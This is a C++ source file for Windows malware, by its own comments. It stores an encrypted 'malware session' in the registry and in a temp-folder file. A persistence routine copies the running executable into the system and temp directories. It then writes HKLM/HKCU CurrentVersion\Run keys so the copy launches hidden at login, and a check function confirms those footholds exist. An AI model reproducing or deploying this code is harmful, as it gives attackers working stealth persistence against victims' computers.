#include "storage.h"

Session::Session(const char* encryptionKeyArg, std::string appNameArg) {
	appName = appNameArg;
	encryptionKey = encryptionKeyArg;
	systemStorage = SystemStorage(appNameArg);
}

Session& Session::operator=(const Session& session) {
	appName = session.appName;
	encryptionKey = session.encryptionKey;
	systemStorage = session.systemStorage;
	return *this;
}


void Session::SaveInfo(const char* key, const char* value) {
	LoadSession(encryptionKey);
	session.insert(std::pair<std::string, std::string>(key, value));
	SaveSession(encryptionKey);
}

std::string Session::FindInfo(const char * key) {
	LoadSession(encryptionKey);
	std::map<std::string, std::string>::iterator it = session.find(key);
	if (it != session.end())
		return it->second;
	else
		return "";
}

void Session::RemoveInfo(const char * key) {
	LoadSession(encryptionKey);
	session.erase(key);
	SaveSession(encryptionKey);
}


void Session::SaveSession(const char* encryptionKey) {
	std::string sessionString;

	for (std::map<std::string, std::string>::iterator it = session.begin();
		it != session.end(); ++it) {
		sessionString.append(it->first + "," + it->second + "|");
	}

	sessionString = EncryptDecrypt(sessionString, encryptionKey);

	systemStorage.SaveValueReg("Software\\Microsoft\\Windows", appName.c_str(),
		sessionString.c_str());
	systemStorage.SaveValueToFile(sessionString.c_str());

}

void Session::LoadSession(const char* encryptionKey) {
	std::string sessionString;
	sessionString = systemStorage.LoadValueReg("Software\\Microsoft\\Windows", appName.c_str());
	if (sessionString.empty()) {
		sessionString = systemStorage.LoadValueFromFile();
	}

	sessionString = EncryptDecrypt(sessionString, encryptionKey);

	session.clear();

	std::string key, tmp;

	for (std::string::iterator it = sessionString.begin();
		it != sessionString.end(); ++it) {

		if (*it == ',') { // end of key
			key = tmp;
			tmp = "";
		}
		else if (*it == '|') { // end of value
							   // write key,value into map
			session.insert(std::pair<std::string, std::string>(key, tmp));;
			tmp = "";
		}
		else {
			tmp += *it;
		}

	}

}


void SystemStorage::SaveValueToFile(const char* value, const char * path) {
	std::string fileName = (appName + ".log").c_str();
	std::string filePath;

	// save in temp folder
	if (path == NULL) {
		char tmpPath[MAX_PATH];
		GetTempPath(MAX_PATH, tmpPath);
		filePath = tmpPath + fileName;

	}
	else {
		filePath = path + fileName;
	}

	std::ofstream file(filePath.c_str());
	std::string stringValue = value;

	if (file.is_open()) {
		for (std::string::iterator it = stringValue.begin();
			it != stringValue.end(); ++it) {
			file << *it;
		}
		file.close();
	}
}

std::string SystemStorage::LoadValueFromFile(const char* path) {
	std::string fileName = (appName + ".log").c_str();
	std::string filePath;

	// save in temp folder
	if (path == NULL) {
		char tmpPath[MAX_PATH];
		GetTempPath(MAX_PATH, tmpPath);
		filePath = tmpPath + fileName;

	}
	else {
		filePath = path + fileName;
	}

	std::ifstream file(filePath.c_str());
	std::string value;
	std::string tmp;

	if (file.is_open()) {
		while (!file.eof()) {
			getline(file, tmp);
			value.push_back('\n');
			value.append(tmp);
		}
	}

	return value;

}

void SystemStorage::SaveValueReg(const char* path, const char* key,
	const char* value) {
	// set value in register
	HKEY hKey;
	HKEY hKey2;

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0,
		KEY_SET_VALUE, &hKey);

	RegOpenKey(HKEY_CURRENT_USER, path, &hKey2);

	if (hKey != NULL) {
		RegSetValueEx(hKey, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}
	if (hKey2 != NULL) {
		RegSetValueEx(hKey2, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}

	RegCloseKey(hKey);
	RegCloseKey(hKey2);
}

std::string SystemStorage::LoadValueReg(const char* path, const char* key) {
	std::string value = "";
	HKEY hKey;

	LONG lresult = RegOpenKey(HKEY_CURRENT_USER, path, &hKey);
	if (lresult != ERROR_SUCCESS) {
		if (hKey != NULL) {
			char szBuffer[512];
			DWORD dwBufferSize = sizeof(szBuffer);
			RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
			value.append(szBuffer);
		}
	}
	else {
		lresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hKey);
		if (lresult != ERROR_SUCCESS) {
			if (hKey != NULL) {
				char szBuffer[512];
				DWORD dwBufferSize = sizeof(szBuffer);
				RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
				value.append(szBuffer);
			}
		}
	}


	RegCloseKey(hKey);
	return value;
}

// verify the existence of malware session.
bool Session::CheckSession() {
	return !(systemStorage.LoadValueReg("Software\\Microsoft\\Windows", appName.c_str()).empty());
}

SystemStorage::SystemStorage(std::string appNameArg) {
	appName = appNameArg;
}

SystemStorage& SystemStorage::operator=(const SystemStorage& systemStorageArg) {
	appName = systemStorageArg.appName;
	return *this;
}


void SystemStorage::Persistance() {
	// copy value in system
	HMODULE module_handler = GetModuleHandle(NULL);
	char file_path[MAX_PATH];
	char system_path[MAX_PATH];
	char system_path_reg[MAX_PATH] = "\"";
	char tmp_path[MAX_PATH];
	char tmp_path_reg[MAX_PATH] = "\"";

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	strcat(system_path_reg, system_path);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(tmp_path_reg, tmp_path);

	strcat(system_path_reg, ("\\" + appName + ".exe\" /noshow").c_str());
	strcat(system_path, ("\\" + appName + ".exe").c_str());
	CopyFile(file_path, system_path, true);

	strcat(tmp_path_reg, (appName + ".exe\" /noshow").c_str());
	strcat(tmp_path, (appName + ".exe").c_str());
	CopyFile(file_path, tmp_path, true);

	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(appName + "1").c_str(), system_path_reg);
	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(appName + "2").c_str(), tmp_path_reg);

}

// verify the existence of malware values created by the persistence function.
bool SystemStorage::CheckPersistance() {
	bool b = false;
	HMODULE module_handler = GetModuleHandle(NULL);
	char system_path[MAX_PATH];
	char file_path[MAX_PATH];
	char tmp_path[MAX_PATH];

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(system_path, ("\\" + appName + ".exe").c_str());
	strcat(tmp_path, (appName + ".exe").c_str());
	std::ifstream fileSys(system_path);
	std::ifstream fileTmp(tmp_path);

	// ((persTmpREG && persTmpFILE) || (persTmpSYS && persTmpSYS))
	if ((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "1").c_str()).empty()) &&
		(fileSys.is_open())) ||
		(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "2").c_str()).empty()) &&
		(fileTmp.is_open()))) b = true;
	/*
	if (!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "1").c_str()).empty()))
	MessageBox(NULL, "TRUERegSys", " ", 0);

	//	MessageBox(NULL, (LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "1").c_str())).c_str()), " ", 0);

	if (fileSys.is_open())
	MessageBox(NULL, "TRUESYS", " ", 0);

	if(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "2").c_str()).empty()))
	MessageBox(NULL, "TRUETmpReg", " ", 0);


	if(fileTmp.is_open()) MessageBox(NULL, "TRUETMp", " ", 0);
	*/

	fileSys.close();
	fileTmp.close();

	return b;
}
